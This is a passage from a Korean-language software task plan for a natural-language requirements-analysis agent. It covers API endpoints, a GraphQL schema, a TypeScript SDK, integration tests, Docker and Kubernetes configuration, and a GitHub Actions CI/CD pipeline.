            raise HTTPException(
                status_code=400,
                detail="No input provided"
            )

        # 멀티모달 처리
        requirements = await multimodal_processor.process_multimodal_input(inputs)

        # 프로젝트 생성
        project_id = await create_project_record(
            user_id=user_id,
            requirements=requirements,
            input_type="multimodal"
        )

        return {
            "project_id": project_id,
            "status": "success",
            "requirements": requirements,
            "input_types_processed": [
                type(inp).__name__ for inp in inputs
            ]
        }

    except Exception as e:
        logger.error(f"Error processing multimodal input: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.websocket("/realtime/{session_id}")
async def realtime_analysis(websocket: WebSocket, session_id: str):
    """실시간 분석 웹소켓 엔드포인트"""

    await websocket.accept()

    try:
        nl_agent = get_nl_agent_instance()
        feedback_processor = RealtimeFeedbackProcessor(nl_agent)

        # 실시간 피드백 처리 시작
        await feedback_processor.handleRealtimeFeedback(
            session_id,
            websocket
        )

    except WebSocketDisconnect:
        logger.info(f"WebSocket disconnected for session {session_id}")
    except Exception as e:
        logger.error(f"WebSocket error: {str(e)}")
        await websocket.close(code=1000)
```

**검증 기준**:

- [ ] RESTful API 설계 원칙 준수
- [ ] 멀티모달 입력 지원
- [ ] WebSocket 실시간 통신
- [ ] 에러 처리 및 로깅

#### SubTask 4.5.2: GraphQL API 스키마 정의

**담당자**: GraphQL 개발자  
**예상 소요시간**: 10시간

**작업 내용**:

```typescript
// backend/src/api/graphql/nl-input-schema.ts
import { gql } from "apollo-server-express";

export const nlInputTypeDefs = gql`
  type Query {
    # 프로젝트 요구사항 조회
    getProjectRequirements(projectId: ID!): ProjectRequirements

    # 세션 컨텍스트 조회
    getSessionContext(sessionId: ID!): SessionContext

    # 명확화 질문 조회
    getClarificationQuestions(sessionId: ID!): [ClarificationQuestion!]

    # 분석 히스토리 조회
    getAnalysisHistory(userId: ID!, limit: Int = 10): [AnalysisHistory!]
  }

  type Mutation {
    # 프로젝트 설명 분석
    analyzeProjectDescription(input: AnalyzeInput!): AnalysisResult!

    # 명확화 응답 처리
    processClarification(
      sessionId: ID!
      answers: [ClarificationAnswer!]!
    ): ClarificationResult!

    # 멀티모달 입력 분석
    analyzeMultimodal(input: MultimodalInput!): AnalysisResult!

    # 피드백 제출
    submitFeedback(projectId: ID!, feedback: FeedbackInput!): FeedbackResult!
  }

  type Subscription {
    # 실시간 분석 상태
    analysisProgress(sessionId: ID!): AnalysisProgress!

    # 명확화 질문 스트림
    clarificationStream(sessionId: ID!): ClarificationUpdate!
  }

  # 입력 타입
  input AnalyzeInput {
    description: String!
    userId: ID!
    language: String = "en"
    context: JSON
    preferences: ProjectPreferences
  }

  input MultimodalInput {
    textDescription: String
    files: [Upload!]
    userId: ID!
    language: String = "en"
  }

  input ProjectPreferences {
    projectType: ProjectType
    techStack: [String!]
    designStyle: String
    targetAudience: String
  }

  input ClarificationAnswer {
    questionId: ID!
    answer: String!
    confidence: Float
  }

  input FeedbackInput {
    rating: Int!
    accuracy: Float
    completeness: Float
    comments: String
    suggestions: [String!]
  }

  # 출력 타입
  type ProjectRequirements {
    id: ID!
    description: String!
    projectType: ProjectType!
    technicalRequirements: [TechnicalRequirement!]!
    nonFunctionalRequirements: [NonFunctionalRequirement!]!
    technologyPreferences: TechnologyPreferences!
    constraints: [Constraint!]!
    extractedEntities: JSON!
    confidence: Float!
  }

  type TechnicalRequirement {
    id: ID!
    category: String!
    description: String!
    priority: Priority!
    complexity: Complexity!
    dependencies: [ID!]
  }

  type NonFunctionalRequirement {
    id: ID!
    type: NFRType!
    description: String!
    metric: String
    target: String
    priority: Priority!
  }

  type TechnologyPreferences {
    frontend: [String!]
    backend: [String!]
    database: [String!]
    cloud: [String!]
    other: JSON
  }

  type Constraint {
    id: ID!
    type: ConstraintType!
    description: String!
    impact: Impact!
  }

  type AnalysisResult {
    projectId: ID!
    status: AnalysisStatus!
    requirements: ProjectRequirements!
    clarificationNeeded: Boolean!
    clarificationQuestions: [ClarificationQuestion!]
    processingTime: Float!
    confidenceScore: Float!
  }

  type ClarificationQuestion {
    id: ID!
    category: String!
    question: String!
    options: [String!]
    required: Boolean!
    impact: Impact!
    context: String
  }

  type ClarificationResult {
    status: String!
    updatedRequirements: ProjectRequirements!
    furtherClarificationNeeded: Boolean!
    remainingQuestions: [ClarificationQuestion!]
  }

  type AnalysisProgress {
    sessionId: ID!
    status: String!
    progress: Float!
    currentStep: String!
    estimatedTimeRemaining: Int
    messages: [String!]
  }

  # Enums
  enum ProjectType {
    WEB_APPLICATION
    MOBILE_APPLICATION
    API_SERVICE
    CLI_TOOL
    DESKTOP_APPLICATION
    LIBRARY
    MICROSERVICE
  }

  enum Priority {
    LOW
    MEDIUM
    HIGH
    CRITICAL
  }

  enum Complexity {
    SIMPLE
    MODERATE
    COMPLEX
    VERY_COMPLEX
  }

  enum NFRType {
    PERFORMANCE
    SECURITY
    USABILITY
    RELIABILITY
    SCALABILITY
    MAINTAINABILITY
    PORTABILITY
  }

  enum ConstraintType {
    TECHNICAL
    BUSINESS
    REGULATORY
    RESOURCE
    TIME
  }

  enum Impact {
    LOW
    MEDIUM
    HIGH
  }

  enum AnalysisStatus {
    PENDING
    ANALYZING
    CLARIFICATION_NEEDED
    COMPLETED
    FAILED
  }
`;

// Resolvers
export const nlInputResolvers = {
  Query: {
    getProjectRequirements: async (_, { projectId }, { dataSources }) => {
      return dataSources.projectAPI.getRequirements(projectId);
    },

    getSessionContext: async (_, { sessionId }, { dataSources }) => {
      return dataSources.sessionAPI.getContext(sessionId);
    },

    getClarificationQuestions: async (_, { sessionId }, { dataSources }) => {
      return dataSources.nlAPI.getClarificationQuestions(sessionId);
    },

    getAnalysisHistory: async (_, { userId, limit }, { dataSources }) => {
      return dataSources.nlAPI.getAnalysisHistory(userId, limit);
    },
  },

  Mutation: {
    analyzeProjectDescription: async (_, { input }, { dataSources }) => {
      const nlAgent = dataSources.nlAgent;

      // 분석 시작
      const startTime = Date.now();

      try {
        // 요구사항 분석
        const requirements = await nlAgent.processDescription(
          input.description,
          {
            language: input.language,
            context: input.context,
            preferences: input.preferences,
          }
        );

        // 명확화 필요 여부 확인
        const ambiguities = await nlAgent.identifyAmbiguities(requirements);
        const clarificationQuestions =
          ambiguities.length > 0
            ? await nlAgent.generateClarificationQuestions(ambiguities)
            : [];

        // 프로젝트 생성
        const projectId = await dataSources.projectAPI.createProject({
          userId: input.userId,
          requirements,
          inputType: "text",
        });

        const processingTime = (Date.now() - startTime) / 1000;

        return {
          projectId,
          status: "COMPLETED",
          requirements,
          clarificationNeeded: clarificationQuestions.length > 0,
          clarificationQuestions,
          processingTime,
          confidenceScore: requirements.confidence,
        };
      } catch (error) {
        throw new Error(`Analysis failed: ${error.message}`);
      }
    },

    processClarification: async (
      _,
      { sessionId, answers },
      { dataSources }
    ) => {
      // 명확화 처리 로직
      const context = await dataSources.sessionAPI.getContext(sessionId);
      const nlAgent = dataSources.nlAgent;

      const updatedRequirements = await nlAgent.processClarifications(
        context.requirements,
        answers
      );

      // 추가 명확화 필요 여부
      const remainingAmbiguities =
        await nlAgent.identifyAmbiguities(updatedRequirements);

      return {
        status: "SUCCESS",
        updatedRequirements,
        furtherClarificationNeeded: remainingAmbiguities.length > 0,
        remainingQuestions: remainingAmbiguities,
      };
    },
  },

  Subscription: {
    analysisProgress: {
      subscribe: (_, { sessionId }, { pubsub }) => {
        return pubsub.asyncIterator([`ANALYSIS_PROGRESS_${sessionId}`]);
      },
    },

    clarificationStream: {
      subscribe: (_, { sessionId }, { pubsub }) => {
        return pubsub.asyncIterator([`CLARIFICATION_${sessionId}`]);
      },
    },
  },
};
```

**검증 기준**:

- [ ] 완전한 GraphQL 스키마 정의
- [ ] Query, Mutation, Subscription 지원
- [ ] 타입 안정성 보장
- [ ] 실시간 업데이트 지원

#### SubTask 4.5.3: SDK 및 클라이언트 라이브러리

**담당자**: SDK 개발자  
**예상 소요시간**: 14시간

**작업 내용**:

```typescript
// sdk/typescript/src/nl-input-client.ts
export interface NLInputClientConfig {
  apiUrl: string;
  apiKey?: string;
  timeout?: number;
  retryConfig?: RetryConfig;
  websocketUrl?: string;
}

export class NLInputClient {
  private config: NLInputClientConfig;
  private httpClient: AxiosInstance;
  private wsClient?: WebSocket;
  private eventEmitter: EventEmitter;

  constructor(config: NLInputClientConfig) {
    this.config = config;
    this.eventEmitter = new EventEmitter();

    // HTTP 클라이언트 설정
    this.httpClient = axios.create({
      baseURL: config.apiUrl,
      timeout: config.timeout || 30000,
      headers: {
        "Content-Type": "application/json",
        ...(config.apiKey && { "X-API-Key": config.apiKey }),
      },
    });

    // 재시도 로직 설정
    if (config.retryConfig) {
      this.setupRetry(config.retryConfig);
    }
  }

  /**
   * 프로젝트 설명 분석
   */
  async analyzeProjectDescription(params: {
    description: string;
    userId: string;
    language?: string;
    context?: any;
  }): Promise<AnalysisResult> {
    try {
      const response = await this.httpClient.post("/analyze", params);
      return response.data;
    } catch (error) {
      throw this.handleError(error);
    }
  }

  /**
   * 명확화 응답 처리
   */
  async processClarification(
    sessionId: string,
    answers: Record<string, any>
  ): Promise<ClarificationResult> {
    try {
      const response = await this.httpClient.post(`/clarify/${sessionId}`, {
        answers,
      });
      return response.data;
    } catch (error) {
      throw this.handleError(error);
    }
  }

  /**
   * 멀티모달 입력 분석
   */
  async analyzeMultimodal(params: {
    description?: string;
    files?: File[];
    userId: string;
    language?: string;
  }): Promise<AnalysisResult> {
    const formData = new FormData();

    if (params.description) {
      formData.append("description", params.description);
    }

    if (params.files) {
      params.files.forEach((file, index) => {
        formData.append(`files`, file);
      });
    }

    formData.append("user_id", params.userId);
    formData.append("language", params.language || "en");

    try {
      const response = await this.httpClient.post("/multimodal", formData, {
        headers: {
          "Content-Type": "multipart/form-data",
        },
      });
      return response.data;
    } catch (error) {
      throw this.handleError(error);
    }
  }

  /**
   * 실시간 분석 시작
   */
  startRealtimeAnalysis(sessionId: string): RealtimeAnalysisSession {
    const wsUrl = `${this.config.websocketUrl}/realtime/${sessionId}`;
    this.wsClient = new WebSocket(wsUrl);

    const session = new RealtimeAnalysisSession(
      this.wsClient,
      this.eventEmitter
    );

    this.wsClient.onopen = () => {
      this.eventEmitter.emit("connected", { sessionId });
    };

    this.wsClient.onmessage = (event) => {
      const data = JSON.parse(event.data);
      this.eventEmitter.emit(data.type, data);
    };

    this.wsClient.onerror = (error) => {
      this.eventEmitter.emit("error", error);
    };

    this.wsClient.onclose = () => {
      this.eventEmitter.emit("disconnected", { sessionId });
    };

    return session;
  }

  /**
   * GraphQL 쿼리 실행
   */
  async graphql<T = any>(
    query: string,
    variables?: Record<string, any>
  ): Promise<T> {
    try {
      const response = await this.httpClient.post("/graphql", {
        query,
        variables,
      });

      if (response.data.errors) {
        throw new GraphQLError(response.data.errors);
      }

      return response.data.data;
    } catch (error) {
      throw this.handleError(error);
    }
  }

  /**
   * 이벤트 리스너 등록
   */
  on(event: string, handler: (data: any) => void): void {
    this.eventEmitter.on(event, handler);
  }

  /**
   * 이벤트 리스너 제거
   */
  off(event: string, handler: (data: any) => void): void {
    this.eventEmitter.off(event, handler);
  }

  private setupRetry(config: RetryConfig): void {
    axiosRetry(this.httpClient, {
      retries: config.maxRetries || 3,
      retryDelay: axiosRetry.exponentialDelay,
      retryCondition: (error) => {
        return (
          axiosRetry.isNetworkOrIdempotentRequestError(error) ||
          error.response?.status === 429
        );
      },
    });
  }

  private handleError(error: any): Error {
    if (error.response) {
      // 서버 응답 에러
      return new APIError(
        error.response.data.message || "Server error",
        error.response.status,
        error.response.data
      );
    } else if (error.request) {
      // 네트워크 에러
      return new NetworkError("Network error occurred");
    } else {
      // 기타 에러
      return new Error(error.message);
    }
  }
}

// 실시간 분석 세션 클래스
export class RealtimeAnalysisSession {
  constructor(
    private ws: WebSocket,
    private eventEmitter: EventEmitter
  ) {}

  /**
   * 피드백 전송
   */
  sendFeedback(feedback: {
    type: "clarification" | "correction" | "addition";
    content: string;
  }): void {
    this.ws.send(JSON.stringify(feedback));
  }

  /**
   * 세션 종료
   */
  close(): void {
    this.ws.close();
  }

  /**
   * 이벤트 구독
   */
  on(event: string, handler: (data: any) => void): void {
    this.eventEmitter.on(event, handler);
  }
}

// React Hook 예제
export function useNLInput(config: NLInputClientConfig) {
  const [client] = useState(() => new NLInputClient(config));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<Error | null>(null);
  const [result, setResult] = useState<AnalysisResult | null>(null);

  const analyze = useCallback(
    async (description: string, userId: string) => {
      setLoading(true);
      setError(null);

      try {
        const result = await client.analyzeProjectDescription({
          description,
          userId,
        });
        setResult(result);
        return result;
      } catch (err) {
        setError(err as Error);
        throw err;
      } finally {
        setLoading(false);
      }
    },
    [client]
  );

  return {
    analyze,
    loading,
    error,
    result,
    client,
  };
}
```

**검증 기준**:

- [ ] TypeScript SDK 구현
- [ ] 전체 API 기능 지원
- [ ] React Hook 제공
- [ ] 에러 처리 및 재시도 로직

#### SubTask 4.5.4: 통합 테스트 스위트

**담당자**: QA 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/tests/integration/test_nl_input_integration.py
import pytest
import asyncio
from httpx import AsyncClient
from unittest.mock import Mock, patch
import websockets

@pytest.mark.integration
class TestNLInputIntegration:
    """NL Input Agent 통합 테스트"""

    @pytest.fixture
    async def client(self):
        async with AsyncClient(app=app, base_url="http://test") as client:
            yield client

    @pytest.fixture
    def test_data(self):
        return {
            "simple_project": {
                "description": "I need a task management web app with user authentication",
                "expected_type": "web_application",
                "expected_features": ["user_authentication", "task_management"]
            },
            "complex_project": {
                "description": """
                Build a scalable e-commerce platform with microservices architecture.
                Must support 1M+ users, real-time inventory, payment processing,
                and multi-language support. Need mobile apps for iOS and Android.
                """,
                "expected_type": "ecommerce",
                "expected_architecture": "microservices"
            },
            "ambiguous_project": {
                "description": "Make a good app",
                "expect_clarification": True
            }
        }

    @pytest.mark.asyncio
    async def test_simple_project_analysis(self, client, test_data):
        """간단한 프로젝트 분석 테스트"""

        response = await client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": test_data["simple_project"]["description"],
                "user_id": "test-user-123"
            }
        )

        assert response.status_code == 200
        data = response.json()

        assert data["status"] == "analysis_complete"
        assert data["requirements"]["project_type"] == test_data["simple_project"]["expected_type"]

        # 기능 요구사항 확인
        tech_reqs = data["requirements"]["technical_requirements"]
        for expected_feature in test_data["simple_project"]["expected_features"]:
            assert any(expected_feature in req for req in tech_reqs)

    @pytest.mark.asyncio
    async def test_complex_project_analysis(self, client, test_data):
        """복잡한 프로젝트 분석 테스트"""

        response = await client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": test_data["complex_project"]["description"],
                "user_id": "test-user-123"
            }
        )

        assert response.status_code == 200
        data = response.json()

        # 아키텍처 패턴 확인
        assert test_data["complex_project"]["expected_architecture"] in str(data["requirements"])

        # 비기능 요구사항 확인
        nfr = data["requirements"]["non_functional_requirements"]
        assert any("1M" in req or "million" in req for req in nfr)

        # 플랫폼 확인
        tech_prefs = data["requirements"]["technology_preferences"]
        assert "iOS" in tech_prefs.get("platforms", [])
        assert "Android" in tech_prefs.get("platforms", [])

    @pytest.mark.asyncio
    async def test_clarification_flow(self, client, test_data):
        """명확화 플로우 테스트"""

        # 1. 모호한 설명 분석
        response = await client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": test_data["ambiguous_project"]["description"],
                "user_id": "test-user-123"
            }
        )

        assert response.status_code == 200
        data = response.json()

        assert data["clarification_needed"] == True
        assert len(data["clarification_questions"]) > 0

        session_id = data.get("session_id", "test-session")
        question_id = data["clarification_questions"][0]["id"]

        # 2. 명확화 응답 제출
        clarification_response = await client.post(
            f"/api/v1/nl-input/clarify/{session_id}",
            json={
                "session_id": session_id,
                "answers": {
                    question_id: "A web application for task management"
                }
            }
        )

        assert clarification_response.status_code == 200
        clarify_data = clarification_response.json()

        assert clarify_data["status"] == "clarification_processed"
        assert clarify_data["updated_requirements"] is not None

    @pytest.mark.asyncio
    async def test_multimodal_input(self, client, tmp_path):
        """멀티모달 입력 테스트"""

        # 테스트 이미지 생성
        test_image = tmp_path / "mockup.png"
        test_image.write_bytes(b"fake image data")

        # 테스트 PDF 생성
        test_pdf = tmp_path / "requirements.pdf"
        test_pdf.write_bytes(b"fake pdf data")

        with open(test_image, "rb") as img, open(test_pdf, "rb") as pdf:
            response = await client.post(
                "/api/v1/nl-input/multimodal",
                data={"user_id": "test-user-123", "language": "en"},
                files=[
                    ("files", ("mockup.png", img, "image/png")),
                    ("files", ("requirements.pdf", pdf, "application/pdf"))
                ]
            )

        assert response.status_code == 200
        data = response.json()

        assert data["status"] == "success"
        assert len(data["input_types_processed"]) == 2

    @pytest.mark.asyncio
    async def test_websocket_realtime_analysis(self):
        """WebSocket 실시간 분석 테스트"""

        session_id = "test-ws-session"

        async with websockets.connect(
            f"ws://localhost:8000/api/v1/nl-input/realtime/{session_id}"
        ) as websocket:
            # 초기 연결 확인
            await asyncio.sleep(0.1)

            # 피드백 전송
            feedback = {
                "type": "clarification",
                "content": "The app should support team collaboration"
            }
            await websocket.send(json.dumps(feedback))

            # 응답 수신
            response = await websocket.recv()
            data = json.loads(response)

            assert data["type"] == "feedback_received"

            # 처리 결과 수신
            result = await asyncio.wait_for(websocket.recv(), timeout=5.0)
            result_data = json.loads(result)

            assert result_data["type"] == "feedback_processed"
            assert "updated_requirements" in result_data

    @pytest.mark.asyncio
    async def test_performance_requirements(self, client):
        """성능 요구사항 테스트"""

        import time

        descriptions = [
            "Simple web app with login",
            "E-commerce site with payment",
            "Mobile app for social networking",
            "API service for data processing",
            "Desktop application for video editing"
        ]

        start_time = time.time()

        # 병렬 요청
        tasks = []
        for desc in descriptions:
            task = client.post(
                "/api/v1/nl-input/analyze",
                json={
                    "description": desc,
                    "user_id": f"user-{hash(desc)}"
                }
            )
            tasks.append(task)

        responses = await asyncio.gather(*tasks)

        end_time = time.time()
        total_time = end_time - start_time

        # 모든 요청 성공 확인
        for response in responses:
            assert response.status_code == 200

        # 평균 응답 시간 확인 (2초 이하)
        avg_time = total_time / len(descriptions)
        assert avg_time < 2.0, f"Average response time {avg_time}s exceeds 2s limit"

    @pytest.mark.asyncio
    async def test_error_handling(self, client):
        """에러 처리 테스트"""

        # 1. 너무 짧은 설명
        response = await client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": "app",
                "user_id": "test-user"
            }
        )

        assert response.status_code == 422  # Validation error

        # 2. 잘못된 언어 코드
        response = await client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": "Build a web application",
                "user_id": "test-user",
                "language": "xyz"  # Invalid language
            }
        )

        assert response.status_code == 400

        # 3. 존재하지 않는 세션
        response = await client.post(
            "/api/v1/nl-input/clarify/non-existent-session",
            json={"answers": {}}
        )

        assert response.status_code == 404
```

**검증 기준**:

- [ ] 전체 API 엔드포인트 테스트
- [ ] 명확화 플로우 검증
- [ ] WebSocket 통신 테스트
- [ ] 성능 요구사항 충족

---

### Task 4.6: NL Agent 배포 및 운영

#### SubTask 4.6.1: 컨테이너화 및 오케스트레이션

**담당자**: DevOps 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```dockerfile
# backend/agents/nl-input/Dockerfile
FROM python:3.11-slim as builder

# 빌드 의존성 설치
RUN apt-get update && apt-get install -y \
    gcc \
    g++ \
    make \
    libffi-dev \
    libssl-dev \
    && rm -rf /var/lib/apt/lists/*

# 작업 디렉토리 설정
WORKDIR /app

# 의존성 파일 복사
COPY requirements.txt requirements-agent.txt ./

# 의존성 설치
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt && \
    pip install --no-cache-dir -r requirements-agent.txt

# 프로덕션 이미지
FROM python:3.11-slim

# 런타임 의존성 설치
RUN apt-get update && apt-get install -y \
    libxml2 \
    libxslt1.1 \
    && rm -rf /var/lib/apt/lists/*

# 비루트 사용자 생성
RUN useradd -m -u 1000 agent && \
    mkdir -p /app/logs /app/cache && \
    chown -R agent:agent /app

WORKDIR /app

# 빌더에서 설치된 패키지 복사
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY --from=builder /usr/local/bin /usr/local/bin

# 애플리케이션 코드 복사
COPY --chown=agent:agent . .

# 환경 변수
ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    AGENT_NAME=nl-input-agent \
    PORT=8080

# 헬스체크
HEALTHCHECK --interval=30s --timeout=10s --start-period=40s --retries=3 \
    CMD python -c "import requests; requests.get('http://localhost:8080/health')"

# 비루트 사용자로 전환
USER agent

# 포트 노출
EXPOSE 8080

# 시작 명령
CMD ["python", "-m", "uvicorn", "src.main:app", "--host", "0.0.0.0", "--port", "8080"]
```

```yaml
# k8s/nl-input-agent/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nl-input-agent
  namespace: t-developer
  labels:
    app: nl-input-agent
    component: agent
    version: v1
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nl-input-agent
  template:
    metadata:
      labels:
        app: nl-input-agent
        component: agent
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
        prometheus.io/path: "/metrics"
    spec:
      serviceAccountName: nl-input-agent
      containers:
        - name: nl-input-agent
          image: t-developer/nl-input-agent:latest
          imagePullPolicy: Always
          ports:
            - containerPort: 8080
              name: http
              protocol: TCP
          env:
            - name: AGENT_NAME
              value: "nl-input-agent"
            - name: AWS_REGION
              value: "us-east-1"
            - name: BEDROCK_MODEL_ID
              value: "anthropic.claude-3-sonnet-v2:0"
            - name: LOG_LEVEL
              value: "INFO"
            - name: REDIS_URL
              valueFrom:
                secretKeyRef:
                  name: redis-credentials
                  key: url
            - name: DYNAMODB_TABLE
              value: "t-developer-nl-contexts"
          envFrom:
            - secretRef:
                name: nl-agent-secrets
            - configMapRef:
                name: nl-agent-config
          resources:
            requests:
              memory: "512Mi"
              cpu: "500m"
            limits:
              memory: "2Gi"
              cpu: "2000m"
          livenessProbe:
            httpGet:
              path: /health
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
            timeoutSeconds: 5
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /ready
              port: 8080
            initialDelaySeconds: 10
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          volumeMounts:
            - name: cache
              mountPath: /app/cache
            - name: models
              mountPath: /app/models
              readOnly: true
      volumes:
        - name: cache
          emptyDir:
            sizeLimit: 1Gi
        - name: models
          configMap:
            name: nl-agent-models
---
apiVersion: v1
kind: Service
metadata:
  name: nl-input-agent
  namespace: t-developer
  labels:
    app: nl-input-agent
spec:
  selector:
    app: nl-input-agent
  ports:
    - port: 80
      targetPort: 8080
      protocol: TCP
      name: http
  type: ClusterIP
---
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: nl-input-agent-hpa
  namespace: t-developer
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: nl-input-agent
  minReplicas: 3
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
    - type: Pods
      pods:
        metric:
          name: http_requests_per_second
        target:
          type: AverageValue
          averageValue: "100"
```

**검증 기준**:

- [ ] Docker 이미지 최적화 (멀티스테이지 빌드)
- [ ] Kubernetes 배포 구성
- [ ] 자동 스케일링 설정
- [ ] 헬스체크 구현

#### SubTask 4.6.2: CI/CD 파이프라인 구성

**담당자**: DevOps 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```yaml
# .github/workflows/nl-input-agent-ci.yml
name: NL Input Agent CI/CD

on:
  push:
    branches: [main, develop]
    paths:
      - "backend/agents/nl-input/**"
      - ".github/workflows/nl-input-agent-ci.yml"
  pull_request:
    branches: [main]
    paths:
      - "backend/agents/nl-input/**"

env:
  AGENT_NAME: nl-input-agent
  AWS_REGION: us-east-1
  ECR_REPOSITORY: t-developer/nl-input-agent

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.9, 3.11]

    steps:
      - uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ matrix.python-version }}

      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements*.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

      - name: Install dependencies
        run: |
          cd backend/agents/nl-input
          pip install -r requirements.txt
          pip install -r requirements-dev.txt

      - name: Lint with flake8
        run: |
          cd backend/agents/nl-input
          flake8 src tests --config=.flake8

      - name: Type check with mypy
        run: |
          cd backend/agents/nl-input
          mypy src --config-file=mypy.ini

      - name: Test with pytest
        run: |
          cd backend/agents/nl-input
          pytest tests/ -v --cov=src --cov-report=xml --cov-report=html
        env:
          PYTHONPATH: ${{ github.workspace }}/backend/agents/nl-input

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./backend/agents/nl-input/coverage.xml
          flags: nl-input-agent
          name: nl-input-agent-coverage

  security:
    runs-on: ubuntu-latest
    needs: test

    steps:
      - uses: actions/checkout@v3

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: "fs"
          scan-ref: "backend/agents/nl-input"
          format: "sarif"
          output: "trivy-results.sarif"

      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: "trivy-results.sarif"

      - name: Run Bandit security linter
        run: |
          pip install bandit
          cd backend/agents/nl-input
          bandit -r src/ -f json -o bandit-report.json

      - name: Upload Bandit results
        uses: actions/upload-artifact@v3
        with:
          name: bandit-report
          path: backend/agents/nl-input/bandit-report.json

  build:
    runs-on: ubuntu-latest
    needs: [test, security]
    if: github.event_name == 'push'

    steps:
      - uses: actions/checkout@v3

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: ${{ env.AWS_REGION }}

      - name: Login to Amazon ECR
        id: login-ecr
        uses: aws-actions/amazon-ecr-login@v1

      - name: Build Docker image
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
          IMAGE_TAG: ${{ github.sha }}
        run: |
          cd backend/agents/nl-input
          docker build -t $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG .
          docker tag $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG $ECR_REGISTRY/$ECR_REPOSITORY:latest

      - name: Scan Docker image
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
          IMAGE_TAG: ${{ github.sha }}
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            aquasec/trivy image --severity HIGH,CRITICAL \
            $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG

      - name: Push Docker image
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
          IMAGE_TAG: ${{ github.sha }}
        run: |
          docker push $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG
          docker push $ECR_REGISTRY/$ECR_REPOSITORY:latest

  deploy-staging:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/develop'
    environment: staging

    steps:
      - uses: actions/checkout@v3

      - name: Configure kubectl
        uses: azure/setup-kubectl@v3
        with:
          version: "v1.27.0"

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: ${{ env.AWS_REGION }}

      - name: Update kubeconfig
        run: |
          aws eks update-kubeconfig --name t-developer-staging --region ${{ env.AWS_REGION }}

      - name: Deploy to staging
        env:
          IMAGE_TAG: ${{ github.sha }}
        run: |
          cd k8s/nl-input-agent
          kustomize edit set image t-developer/nl-input-agent=${{ secrets.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:$IMAGE_TAG
          kubectl apply -k overlays/staging

      - name: Wait for rollout
        run: |
          kubectl rollout status deployment/nl-input-agent -n t-developer-staging --timeout=300s

      - name: Run smoke tests
        run: |
          cd backend/agents/nl-input
          pip install -r requirements-test.txt
          pytest tests/smoke/ -v --staging-url=${{ secrets.STAGING_URL }}

  deploy-production:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/main'
    environment: production

    steps:
      - uses: actions/checkout@v3

      - name: Configure kubectl
        uses: azure/setup-kubectl@v3
        with:
          version: "v1.27.0"

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: ${{ env.AWS_REGION }}

      - name: Update kubeconfig
        run: |
          aws eks update-kubeconfig --name t-developer-production --region ${{ env.AWS_REGION }}

      - name: Deploy to production (canary)
        env:
          IMAGE_TAG: ${{ github.sha }}
        run: |
          cd k8s/nl-input-agent
          kustomize edit set image t-developer/nl-input-agent=${{ secrets.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:$IMAGE_TAG
          kubectl apply -k overlays/production-canary

      - name: Monitor canary deployment
        run: |
          # 카나리 배포 모니터링 스크립트
          ./scripts/monitor-canary.sh nl-input-agent 10m

      - name: Promote to production
        if: success()
        run: |
          kubectl apply -k overlays/production
          kubectl rollout status deployment/nl-input-agent -n t-developer-production --timeout=600s

